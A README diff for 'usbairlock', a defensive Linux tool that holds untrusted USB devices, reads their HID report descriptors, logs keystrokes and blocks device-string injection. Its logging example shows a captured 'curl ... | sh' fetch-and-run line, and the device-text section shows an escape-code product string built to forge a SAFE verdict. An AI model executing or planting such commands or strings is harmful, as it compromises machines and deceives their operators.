@@ -25,6 +25,17 @@ sudo ./usbairlock --paranoid    # every protection on
 Run it in a spare terminal and plug something in. Arrivals print with their descriptors,
 their claimed interfaces and any suspect claims, before a driver touches them.
 
+For a HID device it goes one level further and reads the **report descriptor** -- the
+device's own declaration of what it can send -- over endpoint 0, on an interface no
+driver is allowed to bind. So the question stops being *does it claim to be a keyboard*
+and becomes *what has it declared it can do*:
+
+```
+[HIGH] declares keyboard AND consumer control, vendor-defined channel
+       its own report descriptor says it can type and press media keys and open an
+       arbitrary channel. A keyboard has no reason to.
+```
+
 Every kernel change is reversed on exit, including Ctrl-C, SIGTERM and SIGHUP.
 
 ![usbairlock holding two devices and recording what a keyboard typed](docs/usbairlock.png)
@@ -68,6 +79,7 @@ Each is independent, settable in config or by flag (`--unbind-hid`, `--no-withho
 | `unbind_hid` | off | unbinds and refuses `usbhid`, so a claimed keyboard cannot type |
 | `unbind_storage` | off | refuses `usb-storage` autoprobe |
 | `unbind_net` | off | refuses USB ethernet and RNDIS, which can hijack DNS and routes |
+| `unbind_serial` | off | refuses `cdc_acm`, `ftdi_sio`, `ch341`, `cp210x`, `pl2303`, `option`, so no tty appears for an unknown device |
 | `usbfs_snoop` | off | raw USB traffic into the kernel ring buffer. Very loud |
 
 **`withhold_interface` is the default because it is better on both counts** (kernel 4.13+).
@@ -89,6 +101,347 @@ only its interfaces held: it still reset itself every few seconds, `devnum` clim
 time and invalidating any `/dev/bus/usb/...` path. The loop comes from nothing claiming
 the interface, not from the device being unauthorized. That is why `capture_forever`
 re-resolves and reclaims rather than treating a disconnect as fatal.
+
+## hubs, and what a withheld one hides
+
+`--list` renders the tree, because a flat list of a dock is unreadable:
+
+```
+usb1
+  1-4      05e3:0610  hub   0   [HUB] GenesysLogic USB2.0 Hub
+           opaque  withheld hub: nothing behind it can enumerate, so this
+                   listing cannot show what is
+```
+
+A withheld hub binds no driver, so **nothing behind it enumerates at all**. Its devices
+do not show up as unreachable, they do not show up in any form: the kernel never created
+them. That is worth stating plainly on the hub, because otherwise you plug in a dock
+holding two devices and watch both silently vanish.
+
+It also means an unauthorized hub is an opaque surface rather than a known quantity, and
+a hostile device can present as one.
+
+## addressing a device
+
+`vid:pid` is a **model** identifier, not a device identifier. Plug in two identical
+keyboards and it names both, which is the shape a hostile device most wants: one that
+looks exactly like something already trusted. So every flag that takes a device also
+takes a real address.
+
+```sh
+./usbairlock --list                  # every device, every address
+./usbairlock --list --porcelain      # tab-separated, one record per device
+```
+
+```
+addr           bus/dev   id           ifcls   driver      auth  name
+usb1           001/001   1d6b:0002    09      hub         1     [HUB] xHCI Host Controller
+└ 1-1          001/091   1a2c:2d23    03      usbhid      1     USB USB Keyboard
+└ 1-2          001/089   303a:1001    02,0a   none        0     Espressif USB JTAG
+└ 1-4          001/012   05e3:0608    09      hub         0     [HUB] USB2.0 Hub
+    └ 1-4.1    001/013   1a2c:2d23    03      none        1     USB USB Keyboard
+               unreachable behind unauthorized hub 1-4, nothing below it can enumerate
+```
+
+The tree comes free: sysfs encodes the whole topology in the name. `1-2.3` is port 3 of
+the hub on port 2 of root hub `usb1`, so parentage needs no lookups.
+
+It is worth drawing because **an unauthorized hub silently strands everything beneath
+it**. The device is enumerated, reports `authorized=1`, and cannot be reached, and
+nothing anywhere says why. That is the "I allowed it and nothing happened" case, and it
+is also what a hostile hub with a keyboard behind it looks like.
+
+Root hubs are listed rather than hidden: they are where the gates are actually written,
+so a listing that drops them hides what `--status` changes.
+
+## logging
+
+```sh
+sudo ./usbairlock --auto --log /var/log/usbairlock.jsonl
+```
+
+Appends the event stream as newline-delimited JSON, the **same wire format the viewer
+socket carries**, so a log replays through anything that reads a viewer. One format, two
+sinks.
+
+```json
+{"ev":"session","t":1755..,"protections":["withhold_interface","unbind_hid"],"argv":"--auto --log ..."}
+{"ev":"present","addr":"1-1","id":"1a2c:2d23","worst":"HIGH","authorized":"1","drivers":"usbhid"}
+{"ev":"log","t":1755..,"line":"11:29:16  TYPED   1a2c:2d23  curl -s http://x.sh | sh"}
+```
+
+Three decisions worth knowing. The file is **0600**, because it records what a device
+typed and a world-readable copy of captured keystrokes is a worse outcome than no log.
+Colour is stripped, since escape codes in a forensic artifact are noise and break every
+line-oriented tool. And it is **flushed per line**, because the interesting case is a
+machine that got yanked, where the buffered last line is the one worth having.
+
+The startup baseline is logged in full, including devices `--quiet` hides. A log filtered
+by display preference is not a record of what was attached, and the baseline is the half
+you cannot reconstruct afterwards.
+
+Read one back with `--replay`, which is the viewer's renderer pointed at a file instead of
+a socket:
+
+```sh
+./usbairlock --replay /var/log/usbairlock.jsonl
+./usbairlock --replay /var/log/usbairlock.jsonl --porcelain   # passthrough for scripts
+```
+
+Exit status is 2 if anything in the record scored HIGH, so an old session greps the same
+way a live one does. A truncated final line is skipped rather than fatal, because a
+monitor that got killed is exactly when a log matters and a half-written line is what
+that leaves behind.
+
+## releasing a device you decided to trust
+
+`--authorize` on a device the monitor is capturing stops the capture and rebinds its
+drivers, so the device starts working immediately:
+
+```sh
+sudo ./usbairlock --authorize 1a2c:2d23
+```
+
+The monitor prints `+ allowed` and then `released`, and every viewer sees both. Before
+this, allowing a captured device only exempted a future replug: the capture kept the
+interface claimed through usbfs and kept usbhid detached, so the device was admitted on
+paper and still dead in your hand.
+
+## reading a log
+
+`--replay` needs to read the journal, and `--log` writes it 0600 owned by whoever ran the
+monitor, which is root. So replaying a log usually needs `sudo`:
+
+```sh
+sudo ./usbairlock --replay /tmp/triage.jsonl
+```
+
+## the allow list persists
+
+`--authorize` writes to `/run/usbairlock/allow`, which is how it reaches a monitor in
+another terminal. `/run` is tmpfs, so that list survives every monitor restart until the
+machine reboots. A later `--paranoid` run will leave those devices alone without being
+asked twice, which is the point but is easy to forget:
+
+```sh
+sudo ./usbairlock --forget      # clear it
+```
+
+The monitor names the carried-over devices at startup rather than counting them, because
+a bare count was the only warning that a HIGH device would not be captured this session.
+
+`--forget` does not un-trust a device in a monitor that is already running: it holds its
+allow set in memory and only ever adds. Restart the monitor to pick up a clear.
+
+## what a device declares it can send
+
+A class code is a claim about category: *I am a HID*. The **report descriptor** is a
+claim about capability: *and these are the reports I will produce*. That difference is
+the BadUSB question, and it is the difference between these two verdicts:
+
+```
+[MED]  claims a raw HID interface
+       no boot protocol, so intent is opaque without its report descriptor
+
+[HIGH] declares keyboard AND consumer control, vendor-defined channel
+       its own report descriptor says it can type and press media keys and open an
+       arbitrary channel. A keyboard has no reason to.
+```
+
+The descriptor is fetched with a standard `GET_DESCRIPTOR` on endpoint 0 -- no driver
+and no interface claim -- so **it can be read from a device this tool is holding**, with
+`usbhid` detached and nothing bound. Full declared capability, zero ability to act. The
+kernel returns `EBUSY` for a control transfer aimed at an interface a driver owns, so
+this only runs where it can succeed: HID class, not boot protocol, no driver bound.
+
+A benign descriptor still gets reported rather than passed over in silence:
+
+```
+[LOW]  report descriptor declares consumer, telephony
+       read directly from the device; no keyboard and no vendor-defined channel
+```
+
+That is a real dock's audio HID -- volume, transport keys, and a telephony hook switch.
+"Nothing to report" and "I did not look" must not read alike.
+
+The parser is deliberately partial: usage pages and Input items, no field layout and no
+logical ranges. It never raises on malformed input, because a hostile device is exactly
+the thing that sends a truncated descriptor, and reporting nothing would hand it the
+outcome it wanted -- a descriptor that will not decode is itself flagged.
+
+## the keystroke cannot escape
+
+To read an interface through usbfs you have to authorize it, and authorizing it also
+makes it eligible for `usbhid`. Detaching the driver afterwards shortens that window; it
+does not close it. On 2026-08-22 a key held down across a re-enumeration produced a
+character in the operator's terminal, from a keyboard this tool was holding.
+
+`prepare()` now suspends bus-wide driver auto-binding before authorizing anything:
+
+```
+/sys/bus/usb/drivers_autoprobe -> 0
+   authorize device, authorize interface, claim via usbfs
+/sys/bus/usb/drivers_autoprobe -> restored
+```
+
+With auto-binding off, authorizing an interface creates something usbfs can claim and
+nothing the kernel will bind a driver to, so no input device is ever made. The switch
+goes straight back afterwards, because it only affects the probe that runs when an
+interface is *registered* -- restoring it does not retroactively bind anything.
+
+Not `modprobe -r usbhid`: that is global and would take out the operator's own keyboard.
+
+## what "reversible" has to mean
+
+Every protection is released on exit, and for the driver ones that means the driver is
+**rebound**, not merely stopped being blocked:
+
+```
+cdc_ether: released; r8152: rebound 1 interface(s)
+usb-storage: rebound 1 interface(s)
+
+restored 8 kernel setting(s).
+```
+
+Until 2026-08-22 this was false. `_driver_block(..., on=False)` returned the string
+"released" and reversed nothing, and the monitor's exit path never called it anyway --
+`restore_all()` only puts back saved sysfs values, and an unbind is not a saved value.
+So a flash drive or a USB ethernet adapter was left driverless after a clean Ctrl-C,
+until it was physically replugged. Captured devices hid it, because the capture path
+registers its own rebind and nothing else had one.
+
+That is the same lockout this tool exists to prevent, arriving through the other door.
+The rebind count is printed for the same reason: a restore that silently did not happen
+used to look exactly like one that did.
+
+## the device does not get to write on your terminal
+
+`iProduct`, `iManufacturer`, `iSerial` and `iInterface` are chosen by the device. This
+tool prints them, logs them, and emits them as tab-separated porcelain. Raw, that is a
+way for a device to edit the report about itself:
+
+```
+product = "Mouse\x1b[2A\x1b[2K  [SAFE] nothing suspicious here"
+```
+
+`\x1b[2A\x1b[2K` moves the cursor up two lines and erases them -- which is exactly
+where `[HIGH] claims a boot-protocol KEYBOARD` was printed a moment earlier. A newline
+forges an extra record in line-oriented output; a tab breaks a porcelain field.
+
+Device text is sanitized where it is **read**, so there is no second place to forget,
+and stripped bytes are replaced with `?` rather than dropped -- you should be able to
+see that a device tried. `--replay` sanitizes too: a log is a file, and it can come from
+another machine or from someone who would like it rendered on your terminal.
+
+## the helper tools take argv too
+
+`tools/identify` and `tools/dump` are what you run *after* deciding you do not trust a
+device, so they get the same treatment. `dump` had the worst version of the bug in this
+repo: the chip name is parsed out of the **device's own response** to `flash-id` and was
+interpolated into the `read-flash` command with `shell=True`. A device answering with a
+crafted chip name got its text into a shell command run against the machine it had just
+been plugged into.
+
+Both now build argv lists, a device-supplied name is reduced to a filename component
+before it is used, and a port has to look like a real tty node and exist rather than
+merely start with `/dev/`.
+
+## running as root
+
+The monitor needs root to write the sysfs gates, so everything it does with an argument
+you typed has to be safe at that privilege. Arguments are passed to subprocesses as an
+argv list, never through a shell, and a `VID:PID` is validated before it is used rather
+than trusted.
+
+That is not theoretical tidiness. Until 2026-08-22 `--inspect` built an `lsusb` command
+by string interpolation with `shell=True`, so a spec containing shell metacharacters ran
+as root. `tests/test_injection.py` covers it, including a check that no `sh()` call site
+in the package interpolates a value.
+
+## the word "authorized" means three things
+
+Worth knowing before reading any log line that uses it:
+
+| where | means |
+| --- | --- |
+| `1-1/authorized` | the kernel will create interface objects for this device |
+| `1-1:1.0/authorized` | this interface can be claimed, or bound by a driver |
+| `--authorize` | add to this tool's allow list, and do both of the above |
+
+The kernel overloads the first two by scope and usbairlock adds a third. So a capture
+does not say "authorized 1-1:1.0" any more, it says **made claimable** -- because at
+that moment `usbhid` has already been detached and nothing can bind. Authorizing an
+interface with no matching driver present creates something usbfs can claim and nothing
+that can type at you.
+
+That ordering is the whole trick, and it is a guarantee rather than a race: the driver
+is gone before the gate opens, so there is nothing to lose a race to.
+
+## exit status
+
+| status | meaning |
+| --- | --- |
+| 0 | nothing scored HIGH |
+| 1 | the command could not run: no such device, needs root, file unreadable |
+| 2 | something scored HIGH |
+
+This holds for `--inspect`, `--replay` and the live monitor alike, so a session drops into
+a script without parsing anything:
+
+```sh
+sudo ./usbairlock --auto --log /tmp/triage.jsonl || echo "something claimed HIGH"
+```
+
+The monitor only ever exits through a signal handler, and that path calls `os._exit`,
+which discards whatever the code would otherwise have returned. The verdict is recorded
+when the device arrives rather than computed on the way out.
+
+## machine-readable output
+
+`--porcelain` works on every one-shot mode, not just the monitor: tab-separated records,
+stable field order, no colour and no layout. The pretty output is free to change, this is
+not.
+
+Every line is a record, including the startup banner, departures, serial nodes appearing
+and the exit line -- those used to be printed as prose into the machine stream, so a
+consumer hit unparseable lines and, because departures had no record at all, watched
+devices arrive and never leave.
+
+Every device-identifying record carries `addr`. With two devices of the same model
+attached the records were otherwise byte-identical and you could not tell which one had
+arrived. `tests/test_porcelain.py` asserts both properties, including that no record kind
+is ever emitted with two different field sets.
+
+```
+$ ./usbairlock --inspect --porcelain
+present	addr=1-1	id=1a2c:2d23	name=USB Keyboard	authorized=1	drivers=usbhid	worst=HIGH
+threat	addr=1-1	id=1a2c:2d23	level=HIGH	claim=claims a boot-protocol KEYBOARD
+
+$ ./usbairlock --status --porcelain
+gate	root=usb1	authorized_default=0	interface_authorized_default=0	withheld=1
+```
+
+Record kinds: `dev`, `gate`, `present`, `threat`, `protection`, `diag`, `kmsg`, `session`,
+`log`, `arrived`, `disarm`.
+
+
+| form | example | unique |
+| --- | --- | --- |
+| sysfs name, the bus-port chain | `1-2` | yes, stable across replug into the same port |
+| bus and device number | `001/089`, `1:89` | yes, until it re-enumerates |
+| usbfs node | `/dev/bus/usb/001/089` | yes, until it re-enumerates |
+| vid:pid | `303a:1001` | **no**, matches every device of that model |
+
+Any of them works anywhere a device is named:
+
+```sh
+sudo ./usbairlock --inspect 1-2
+sudo ./usbairlock --capture 1-1
+sudo ./usbairlock --authorize 001/089
+```
+
+`--authorize` says so out loud when a `vid:pid` matched more than one device, rather than
+acting on whichever the filesystem listed first.
 
 ## the allow list, and hiding
 
@@ -226,7 +579,9 @@ Searched in order: `~/.config/usbairlock/config`, then `/etc/usbairlock.conf`.
 ## what it catches, and what it cannot
 
 Read `notes/threat-model.md`. The short version: this fully covers the BadUSB and Rubber
-Ducky class, because that attack has to declare itself in a descriptor before it can act.
+Ducky class, because that attack has to declare itself in a descriptor before it can act
+-- and since the report descriptor is read too, "declare itself" now means its stated
+capability, not just the class code it hides behind.
 It **cannot** see a USB killer, which finishes in microseconds with no enumeration, and it
 cannot tell a charge-only cable from an empty port, because both produce the same absence
 of any event. Those are physical layer and want an inline hardware tier, which is planned and not
@@ -260,14 +615,19 @@ tables. Everything Linux-specific lives elsewhere.
 | `./usbairlock --observe` | watch only, change nothing, no root |
 | `sudo ./usbairlock --paranoid` | every protection on |
 | `./usbairlock --status` | what is protected right now |
-| `./usbairlock --inspect [VID:PID]` | one-shot: what is attached and what it claims |
+| `./usbairlock --list` | the device tree with low-level addresses. `--porcelain` for scripts |
+| `sudo ./usbairlock --auto --log FILE` | append the event stream as ndjson, 0600 |
+| `./usbairlock --replay FILE` | render a log back. Exit 2 if anything in it scored HIGH |
+| `./usbairlock --inspect [ADDR]` | one-shot: what is attached and what it claims |
 | `./usbairlock --diagnose` | nothing appeared. Why not |
 | `sudo ./usbairlock --arm` / `--disarm` | apply or release protections and exit, persistently |
 | `sudo ./usbairlock --authorize VID:PID` | admit one device, and share that decision with a running monitor |
 | `sudo ./usbairlock --attach` | read-only view of a monitor already running elsewhere |
+| `sudo ./usbairlock --forget` | clear the allow list, which otherwise persists in `/run` until reboot |
 | `./usbairlock --write-config` | print a config file |
 
-Exit status of `--inspect` is 2 when anything scored HIGH, so it drops into a script.
+Exit status is 2 when anything scored HIGH, for `--inspect`, `--replay` and the monitor
+alike. See **exit status** above.
 
 ## requirements
 
@@ -288,6 +648,14 @@ install them.
 python3 tests/test_threats.py     # threat assessment, synthetic descriptors
 python3 tests/test_ipc.py         # lock, shared allow list, viewer channel
 python3 tests/test_restore.py     # what exit puts back, including the lockout regression
+python3 tests/test_topology.py    # hub parentage, stranding and port order, from the sysfs name
+python3 tests/test_replay.py      # --replay reads back what --log wrote
+python3 tests/test_injection.py   # no shell metacharacter path from argv to root
+python3 tests/test_devicetext.py  # a device cannot rewrite the verdict about itself
+python3 tests/test_rebind.py      # unbinding a driver is reversible, or it is the lockout
+python3 tests/test_porcelain.py   # every line is a record, and records identify a device
+python3 tests/test_hidreport.py   # what a device declares it can send, from its descriptor
+python3 tests/test_release.py     # allowing a device releases it, chords, protections
 ```
 
 No pytest, no dependencies. These exist because the detector had never fired on real
